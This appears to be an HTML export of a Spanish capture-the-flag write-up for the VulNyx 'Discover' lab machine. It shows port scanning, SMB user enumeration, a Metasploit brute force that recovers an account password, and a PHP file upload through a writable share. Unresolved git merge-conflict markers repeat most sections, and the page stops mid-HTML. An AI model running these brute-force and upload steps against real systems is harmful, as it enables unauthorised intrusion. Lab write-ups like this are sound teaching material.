<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">VulNyx - Discover | noname</title>
<meta property="og:title" content="VulNyx - Discover | noname" />
<meta name="twitter:title" content="VulNyx - Discover | noname" />
<meta itemprop="name" content="VulNyx - Discover | noname" />
<meta name="application-name" content="VulNyx - Discover | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup Discover 🟡">
<meta itemprop="description" content="Writeup Discover 🟡" />
<meta property="og:description" content="Writeup Discover 🟡" />
<meta name="twitter:description" content="Writeup Discover 🟡" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

<<<<<<< HEAD
  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/discover/" title="" />

=======
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a


  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.webp" />
  <meta property="og:image" content="https://0x-noname.github.io/images/logo.webp" />
  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.webp" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.webp" />




    
    
    
<<<<<<< HEAD
=======
    
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-07-25T18:24:42&#43;0200 />
    <meta property="article:published_time" content=2023-07-25T18:24:42&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "VulNyx - Discover",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-07-25",
        "description": "Writeup Discover 🟡",
        "wordCount":  1072 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-07-25",
        "image": {
        "@type": "imageObject",
        "url": "\/images\/logo.webp"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<<<<<<< HEAD
<meta name="generator" content="Hugo 0.125.7">
=======
<meta name="generator" content="Hugo 0.111.3">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/discover/">
<<<<<<< HEAD
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
=======
    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
<<<<<<< HEAD
    
  

</head>
<body data-theme = "" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

=======
    </head>
<body data-theme = "" class="notransition">
<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<<<<<<< HEAD
<title></title>
=======
<title>Home</title>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
<<<<<<< HEAD
                
                
=======
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">VulNyx - Discover</h1>
                
<<<<<<< HEAD
                
                <div class="post-meta">
                    <time datetime="2023-07-25T18:24:42&#43;02:00" itemprop="datePublished"> Jul 25, 2023 </time>
                </div>
                
            </header>
            
            <div class="page-content">
=======
                <div class="post-meta">
                    <time datetime="2023-07-25T18:24:42&#43;02:00" itemprop="datePublished"> Jul 25, 2023 </time>
                </div>
            </header><div class="page-content">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
                <p><img src="/../machines/nyx/discover/discover_logo.webp" alt="logo"></p>
<ul>
<li><em>SMB Brute Force</em></li>
<li><em>Upload Shell</em></li>
<li><em>Abusing Setarch Binary</em></li>
<li><em>Abusing Pydoc3</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -v -T5 -n 192.168.1.17
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp  open  ssh
</span></span><span class="line"><span class="cl">80/tcp  open  http
</span></span><span class="line"><span class="cl">81/tcp  open  hosts2-ns
</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80,81,139,445 192.168.1.17
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 f0e624fb9eb07a1abdf7b185237fb16f (RSA)
</span></span><span class="line"><span class="cl">|   256 99c87431451058b0cecc63b47a82573d (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 60da3e3138fab549ab48c3432c9fd132 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp  open  http        nginx 1.18.0
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0
</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/html).
</span></span><span class="line"><span class="cl">81/tcp  open  http        Apache httpd 2.4.56 ((Debian))
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Debian)
</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/html).
</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn Samba smbd 4.6.2
</span></span><span class="line"><span class="cl">445/tcp open  netbios-ssn Samba smbd 4.6.2
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl">| smb2-time: 
</span></span><span class="line"><span class="cl">|   date: 2023-07-09T17:41:48
</span></span><span class="line"><span class="cl">|_  start_date: N/A
</span></span><span class="line"><span class="cl">| smb2-security-mode: 
</span></span><span class="line"><span class="cl">|   311: 
</span></span><span class="line"><span class="cl">|_    Message signing enabled but not required
</span></span><span class="line"><span class="cl">| nbstat: NetBIOS name: DISCOVER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
</span></span><span class="line"><span class="cl">| Names:
</span></span><span class="line"><span class="cl">|   DISCOVER&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl">|   DISCOVER&lt;03&gt;         Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl">|   DISCOVER&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span></code></pre></div><p>Primeramente realizo la enumeración <strong>SMB</strong> con <strong>rpcclient</strong> y encuentro dos usuarios.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ rpcclient -U &#34;&#34; -N 192.168.1.17
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
</span></span><span class="line"><span class="cl">	DISCOVER       Wk Sv PrQ Unx NT SNT Samba 4.13.13-Debian
</span></span><span class="line"><span class="cl">	platform_id     :	500
</span></span><span class="line"><span class="cl">	os version      :	6.1
</span></span><span class="line"><span class="cl">	server type     :	0x809a03
</span></span><span class="line"><span class="cl">rpcclient $&gt; querydispinfo and enumdomusers
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: ken	Name: 	Desc: 
</span></span><span class="line"><span class="cl">index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: takeshi	Name: 	Desc: 
</span></span></code></pre></div><p>Realizo fuerza bruta al usuario <strong>ken</strong> con el módulo <code>smb_login</code> de Metasploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf6 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS 192.168.1.17
</span></span><span class="line"><span class="cl">msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBUser ken
</span></span><span class="line"><span class="cl">msf6 auxiliary(scanner/smb/smb_login) &gt; set THREADS 100
</span></span><span class="line"><span class="cl">msf6 auxiliary(scanner/smb/smb_login) &gt; run
</span></span><span class="line"><span class="cl">[+] 192.168.1.17:445      - 192.168.1.17:445 - Success: &#39;.\ken:kenken&#39;
</span></span></code></pre></div><p>Me conecto con <strong>smbmap</strong> y veo un recurso llamado ken con permisos de <em>escritura, lectura y subida de archivos</em>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ smbmap -u &#34;ken&#34; -p &#34;kenken&#34; -H 192.168.1.17
</span></span><span class="line"><span class="cl">[+] IP: 192.168.1.17:445	Name: discover.nyx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Disk    Permissions	Comment
</span></span><span class="line"><span class="cl">----    -----------	-------
</span></span><span class="line"><span class="cl">print$  READ ONLY	Printer Drivers
</span></span><span class="line"><span class="cl">IPC$    NO ACCESS	IPC Service (Samba 4.13.13-Debian)
</span></span><span class="line"><span class="cl">ken     READ, WRITE	File Upload Path
</span></span></code></pre></div><p>Me conecto al recurso <strong>ken</strong>, subo una <code>shell.php</code> pero no interpreta php así que realizo fuerza bruta de directorios al puerto <strong>81</strong> y encuentro la ruta <code>/under_construction</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -c --hw=31,1 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#34;http://discover.nyx:81/FUZZ/&#34;
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Target: http://discover.nyx:81/FUZZ/
</span></span><span class="line"><span class="cl">Total requests: 220560
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                                
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">                                                                               
</span></span><span class="line"><span class="cl">000022003:   403        9 L      28 W       277 Ch      &#34;under_construction&#34;
</span></span></code></pre></div><p>En <code>under_construction</code> me sale el siguiente mensaje:</p>
<p><img src="/../machines/nyx/discover/under_construction81.webp" alt="under_construction81"></p>
<p>Mediante el método <strong>POST</strong> encuentro el dominio <code>todiscover.nyx</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">❯ curl -s -X POST &#34;http://discover.nyx:81/under_construction/&#34;
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Under Construction<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Under Construction<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>We are working to improve our website.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>contact: support@todiscover.nyx<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Creo el archivo <code>info.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">phpinfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>Lo subo con el usuario ken.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ smbclient -U &#34;ken%kenken&#34; \\\\192.168.1.17\\ken
</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: \&gt; put info.php
</span></span><span class="line"><span class="cl">putting file info.php as \info.php (2,9 kb/s) (average 2,9 kb/s)
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -v -T5 -n 192.168.1.17
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp  open  ssh
</span></span><span style="display:flex;"><span>80/tcp  open  http
</span></span><span style="display:flex;"><span>81/tcp  open  hosts2-ns
</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -sVC -v -p 22,80,81,139,445 192.168.1.17
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   3072 f0e624fb9eb07a1abdf7b185237fb16f (RSA)
</span></span><span style="display:flex;"><span>|   256 99c87431451058b0cecc63b47a82573d (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 60da3e3138fab549ab48c3432c9fd132 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp  open  http        nginx 1.18.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span><span style="display:flex;"><span>81/tcp  open  http        Apache httpd 2.4.56 ((Debian))
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 (Debian)
</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 4.6.2
</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 4.6.2
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2023-07-09T17:41:48
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   311: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| nbstat: NetBIOS name: DISCOVER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
</span></span><span style="display:flex;"><span>| Names:
</span></span><span style="display:flex;"><span>|   DISCOVER&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   DISCOVER&lt;03&gt;         Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   DISCOVER&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span></code></pre></div><p>Primeramente realizo la enumeración <strong>SMB</strong> con <strong>rpcclient</strong> y encuentro dos usuarios.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ rpcclient -U &#34;&#34; -N 192.168.1.17
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rpcclient $&gt; srvinfo
</span></span><span style="display:flex;"><span>	DISCOVER       Wk Sv PrQ Unx NT SNT Samba 4.13.13-Debian
</span></span><span style="display:flex;"><span>	platform_id     :	500
</span></span><span style="display:flex;"><span>	os version      :	6.1
</span></span><span style="display:flex;"><span>	server type     :	0x809a03
</span></span><span style="display:flex;"><span>rpcclient $&gt; querydispinfo and enumdomusers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: ken	Name: 	Desc: 
</span></span><span style="display:flex;"><span>index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: takeshi	Name: 	Desc: 
</span></span></code></pre></div><p>Realizo fuerza bruta al usuario <strong>ken</strong> con el módulo <code>smb_login</code> de Metasploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>msf6 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS 192.168.1.17
</span></span><span style="display:flex;"><span>msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBUser ken
</span></span><span style="display:flex;"><span>msf6 auxiliary(scanner/smb/smb_login) &gt; set THREADS 100
</span></span><span style="display:flex;"><span>msf6 auxiliary(scanner/smb/smb_login) &gt; run
</span></span><span style="display:flex;"><span>[+] 192.168.1.17:445      - 192.168.1.17:445 - Success: &#39;.\ken:kenken&#39;
</span></span></code></pre></div><p>Me conecto con <strong>smbmap</strong> y veo un recurso llamado ken con permisos de <em>escritura, lectura y subida de archivos</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ smbmap -u &#34;ken&#34; -p &#34;kenken&#34; -H 192.168.1.17
</span></span><span style="display:flex;"><span>[+] IP: 192.168.1.17:445	Name: discover.nyx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Disk    Permissions	Comment
</span></span><span style="display:flex;"><span>----    -----------	-------
</span></span><span style="display:flex;"><span>print$  READ ONLY	Printer Drivers
</span></span><span style="display:flex;"><span>IPC$    NO ACCESS	IPC Service (Samba 4.13.13-Debian)
</span></span><span style="display:flex;"><span>ken     READ, WRITE	File Upload Path
</span></span></code></pre></div><p>Me conecto al recurso <strong>ken</strong>, subo una <code>shell.php</code> pero no interpreta php así que realizo fuerza bruta de directorios al puerto <strong>81</strong> y encuentro la ruta <code>/under_construction</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c --hw=31,1 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#34;http://discover.nyx:81/FUZZ/&#34;
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://discover.nyx:81/FUZZ/
</span></span><span style="display:flex;"><span>Total requests: 220560
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>=====================================================================
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                
</span></span><span style="display:flex;"><span>=====================================================================
</span></span><span style="display:flex;"><span>                                                                               
</span></span><span style="display:flex;"><span>000022003:   403        9 L      28 W       277 Ch      &#34;under_construction&#34;
</span></span></code></pre></div><p>En <code>under_construction</code> me sale el siguiente mensaje:</p>
<p><img src="/../machines/nyx/discover/under_construction81.webp" alt="under_construction81"></p>
<p>Mediante el método <strong>POST</strong> encuentro el dominio <code>todiscover.nyx</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>❯ curl -s -X POST &#34;http://discover.nyx:81/under_construction/&#34;
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;Under Construction&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
